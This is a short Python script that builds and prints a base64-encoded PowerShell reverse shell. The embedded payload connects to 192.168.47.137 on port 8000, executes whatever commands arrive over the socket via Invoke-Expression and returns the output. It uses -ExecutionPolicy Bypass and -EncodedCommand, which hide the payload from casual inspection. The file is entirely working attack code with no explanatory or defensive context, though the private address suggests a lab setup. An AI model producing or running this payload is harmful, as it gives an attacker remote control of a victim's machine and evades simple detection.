import base64

def encode_to_base64(ps_script):
    ps_command = f"powershell -NoProfile -ExecutionPolicy Bypass -Command \"{ps_script}\""
    ps_bytes = ps_command.encode('utf-16le')
    base64_command = base64.b64encode(ps_bytes).decode('utf-8')
    return base64_command

ps_script = """
$client = New-Object System.Net.Sockets.TCPClient("192.168.47.137", 8000)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

$writer.AutoFlush = $true
$buffer = New-Object System.Byte[] 65536

try {
    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $input = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()
        if ($input -eq "exit") {
            break
        }
        try {
            $output = & (Invoke-Expression $input 2>&1 | Out-String)
        } catch {
            $output = "Error: " + $_.Exception.Message
        }
        $writer.WriteLine($output)
    }
}
catch {
    $writer.WriteLine("Stream error: " + $_.Exception.Message)
}
finally {
    $reader.Close()
    $writer.Close()
    $stream.Close()
    $client.Close()
}
"""

base64_command = encode_to_base64(ps_script)
print(f"powershell -EncodedCommand {base64_command}")
